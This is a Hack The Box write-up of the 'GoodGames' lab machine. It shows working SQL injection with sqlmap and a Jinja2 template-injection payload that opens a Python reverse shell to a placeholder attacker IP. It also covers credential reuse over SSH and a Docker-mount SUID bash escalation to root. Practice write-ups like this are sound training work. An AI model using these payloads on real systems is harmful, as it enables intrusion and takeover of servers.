---
layout: post
title: HTB GoodGames Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/goodgames/logo.png
tags: [HTB]
---

# Notes
![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/logo.png)


| Name | Return |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 21 Feb 2022 |
| DIFFICULTY | Easy |


IP:10.10.11.130

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb
```

# HTTP 80

This website looks like it is some video game site. Looking around the home page at the bottom I found `GoodGames.HTB`. I'll add the entry `10.10.11.130 goodgames.htb` to `/etc/passwd` for name resolution.

I was tested a bunch of inputs for sqli and I found one that was vulnerable to a time-based blink attack. If you click on the little profile box on the top right of the main screen we get brought to a sign-in page

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/a7edb2f068be40b8b0a933bdec9d85bd.png)


I gave it some parameters and captured the request in burp.

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/5b05e60e15c14ebe9591d69fa683f2e9.png)


I saved the request as `request.txt` and used sqlmap to test the two parameters "email" and "password".

```
POST /login HTTP/1.1
Host: goodgames.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://goodgames.htb
Connection: close
Referer: http://goodgames.htb/
Upgrade-Insecure-Requests: 1

email=test%40test.com&password=test
```

The command I ran was `sqlmap -r request.txt --batch`. The `-r` specifies a request file (the request I intercepted above) and `--batch` just makes it go without asking for user input. I let it run and it came back as vulnerable

```
Parameter: email (POST)                                                                                                                                                                      
    Type: time-based blind                                                                                                                                                                   
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                 
    Payload: email=test@test.com' AND (SELECT 9842 FROM (SELECT(SLEEP(5)))qyrv) AND 'IOxB'='IOxB&password=test
```

Now I can run `sqlmap -r request.txt --dbs` to view the databases and we can see two information_schema and main. Lets get the tables from "main" by running `sqlmap -r request.txt -D main --tables`. We then can see three tables blog, blog_comments, and user. Finially we can get the data from the user table with `sqlmap -r request.txt -D main -T user --dump`

```
| 1  | admin | admin@goodgames.htb                         | 2b22337f218b2d82dfc3b6f77e7cb8ec 
```

I used crackstion.net to see if the hash has been cracked and it has been

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/b08110960c7142f184c5c28dd93bc590.png)


I can now log in with the creds. From the sqlmap I got a username of "admin" I was able to guess the email address because I found the hostname earlier

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/7a981f768fb44e86906a3243947f2824.png)


Once signed it I now have a little gear at the top right corner

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/2ff013ce4aba4d6d86cf7047c00b593a.png)


But if I click it I get the error below. To fix this I'll add `internal-administration.goodgames.htb` to my `/etc/hosts` file

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/e6141cb3d13044878dc2ea8480106317.png)


Then I'm sent to another login page and the same credentials `admin:superadministrator` gets me into this page

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/1cd03c6c71224d72a3cb98b8e0ce479e.png)


Under `/settings` , I found that it was vulnerable to Server Side Template Injection. I tested this by putting {{1+1}} into the "Full Name section". Notice that the name changed to "2"

![GoodGames](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/goodgames/006a86b7dcd5472bbe3f2a71695e9d42.png)


I found this article that gives an example of a reverse shell using ssti. https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6

I intercepted the request to `/settings` and put the ssti payload into "name" and sent it to repeater in case we lose our shell.

```
POST /settings HTTP/1.1

Host: internal-administration.goodgames.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 403

Origin: http://internal-administration.goodgames.htb

Connection: close

Referer: http://internal-administration.goodgames.htb/settings

Cookie: session=.eJwlzjtOBEEMhOG7dEzg8qMfe5nRdNsWCAmkmd0IcXdaIqu_ou-nHHnF_V4ez-sVb-X48PIolVY_zwET7RU-PaXPIRySYro3ujSyVE6FyJnQHuTLWMh6sgsipNqoatJcGYTGDmYdETw1Umt0N0ftzSeitSWuTliO1cqGvO64_jXYue4rj-f3Z3ztY6rwUvZTU2UkEUbltuAw30Y2sNFMKb9_AWU9Rg.YiJ89g.qLUNmWogzp4ELPNX6Wz5CEJz45w

Upgrade-Insecure-Requests: 1



name={% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOURIP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

I'll start a listener `nc -lvnp 4444` and send the request

SHELL

```
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.130] 36478
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

# Escaping Docker

I like having better shells so I'll use a python one-liner to upgrade my shell `python -c 'import pty; pty.spawn("/bin/bash")'`. I can see that I'm in a docer container because of the hostname and there is a Dockerfile in the directory

```
root@3a453ab39d3d:/backend# ls
ls
Dockerfile  project  requirements.txt
```

If we go into `/home/augustus` we can read the user.txt file. We can also see that the UID of the files are `1000` . This hints that the user augustus has mounted his home directory into this docker container.

Doing a little bit of networking enumeration by running `ip a` we can see that our ip is `172.19.0.2`. I bet that the host (being the machine running docker) is `172.19.0.1`.

```
root@3a453ab39d3d:/home/augustus# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
root@3a453ab39d3d:/home/augustus# 
```

I tried to ping the host machine and it is indeed up `64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.057 ms`. I dont have nmap on this machine but I can use a bash one-liner to try and do a quick port scan on the host

```bash
for PORT in {0..100}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
<ull" 2>/dev/null && echo "port $PORT is open"; done
```

I then get an output of

```
┌──(root💀kali)-[~/htb/goodgames]
└─# nc -lvnp 4444                                                                                                                                                                        1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.130] 54898
/bin/sh: 0: can't access tty; job control turned off
# python -c 'import pty; pty.spawn("/bin/bash")'
root@3a453ab39d3d:/backend# for PORT in {0..100}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
<ull" 2>/dev/null && echo "port $PORT is open"; done
port 22 is open
port 80 is open
```

There is a good chance we can reuse our credentials so ssh into the host machine as `augustus:superadministrator` and it goes through!

```
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1           
ssh augustus@172.19.0.1                       
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.                                                                                                                     
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes                                           
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright. 

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$
```

# Root

If we remember from before the path `/home/augustus` was mounted to the docker container. We might be able to copy `/bin/bash` to `/home/augustus` and use our root privilege's on the docker container to change the owner and SUID permissions to allow augustus to run it as root

Notice the euid is set to 0 allowing us to run things as root

```
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls
ls
bash user.txt
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.

root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4755 bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Mar  4 21:52:23 2022 from 172.19.0.2

augustus@GoodGames:~$ ls -la
total 1984
...
-rwsr-xr-x 1 root     root     1234376 Mar  4 21:52 bash
-rw-r----- 1 root     augustus      33 Mar  4 20:14 user.txt
...

augustus@GoodGames:~$ ./bash -p
bash-5.1# cat /root/root.txt
cat /root/root.txt
FLAG
bash-5.1# id
id
uid=1000(augustus) gid=1000(augustus) euid=0(root) groups=1000(augustus)	
```
